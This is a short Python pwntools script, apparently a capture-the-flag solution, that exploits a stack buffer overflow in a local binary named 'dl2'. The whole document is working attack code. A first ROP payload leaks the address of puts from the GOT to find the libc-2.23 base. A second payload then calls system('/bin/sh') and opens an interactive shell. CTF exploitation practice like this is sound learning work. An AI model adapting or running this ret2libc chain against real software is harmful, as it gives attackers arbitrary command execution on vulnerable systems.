#coding:utf-8
from pwn import *

context.arch = 'amd64'

elf = ELF("./dl2")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")

# io = gdb.debug('./dl2', 'b *0x400751')
io = process(['./dl2'])

main        = 0x0000000000400753
PrdiR       = 0x400853
plt_puts  = elf.plt['puts']
got_puts  = elf.got['puts']

p1 = flat('\0'*0x20, 0, 
        PrdiR, got_puts, 
        plt_puts, 
        main
    )

io.sendlineafter("plz\n", p1)
io.recvuntil("Hello \n")

puts_addr = u64(io.recv(6)+'\0\0')
libc.address = puts_addr - libc.symbols['puts']

print("libc base : " + hex(libc.address))


binsh_addr      = next(libc.search('/bin/sh\0'))
system_addr     = libc.symbols['system']

p2 = flat('\0'*0x20, 0, PrdiR, binsh_addr, system_addr)
io.sendlineafter("plz\n", p2)

io.interactive()
